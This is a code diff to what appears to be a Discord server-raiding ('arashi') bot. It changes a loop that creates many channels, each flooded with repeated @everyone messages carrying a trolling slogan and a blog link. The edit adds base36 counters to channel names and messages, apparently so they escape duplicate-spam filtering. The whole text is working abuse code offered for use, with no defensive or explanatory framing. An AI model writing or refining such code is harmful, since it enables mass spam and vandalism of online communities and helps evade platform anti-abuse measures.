@@ -76,17 +76,17 @@ https://discord.gg/annycW3Xrk
         "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
       );
 
-      for (let i = 0; i < max; i++) {
+      for (let i = 0; i < (max / 2); i++) {
         discordServer?.channels
           .create({
-            name: text?.split("\n")[0] ?? "荒らし共栄圏万歳！",
+            name: (text?.split("\n")[0] ?? "荒らし共栄圏万歳！") + `${i.toString(36)}`,
             type: 0,
           })
           .then(async (channel) => {
             for (let j = 0; j < max; j++) {
               await channel.send(
-                text ??
-                  "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
+                (text ??
+                  "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone") + `\n${j.toString(36)}`
               );
             }
           });
